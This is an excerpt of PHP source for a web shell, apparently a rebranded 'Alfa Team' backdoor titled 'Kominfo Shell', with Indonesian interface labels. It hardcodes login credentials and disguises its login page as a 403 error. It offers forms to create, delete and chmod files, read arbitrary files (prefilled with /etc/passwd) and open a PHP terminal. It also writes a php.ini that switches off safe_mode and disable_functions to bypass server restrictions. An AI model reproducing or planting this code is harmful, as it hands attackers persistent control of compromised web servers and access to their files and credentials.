...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '68e6f3ce182007a578dbff4fffd5daa2',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
<center><img style="border-radius:100px;" width="8000" height="250" alt="alfa team 2012" draggable="false" src="https://himafifmipaunri.or.id/wp-content/uploads/2021/06/KOMINFO-1024x1024.png" /></center>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Kominfo Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://himafifmipaunri.or.id/wp-content/uploads/2021/06/KOMINFO-1024x1024.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['alfamini']='https://imgtr.ee/images/2024/07/19/08830d20f48fcc938fe2034b8daa7173.png';
...
<tr>
<td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text'>Buat File Baru: </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text'>Buat Dir Baru : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text'>Hapus Nama File : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
<td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text'>Hati-Hati Chmod : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Lihat Dir Lain : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars($GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
<td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Baca File Dir Lain: </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Command dibaca Comend :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By vinooo_sys(ALFA TEaM)");
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://himafifmipaunri.or.id/wp-content/uploads/2021/06/KOMINFO-1024x1024.png\"></p>";
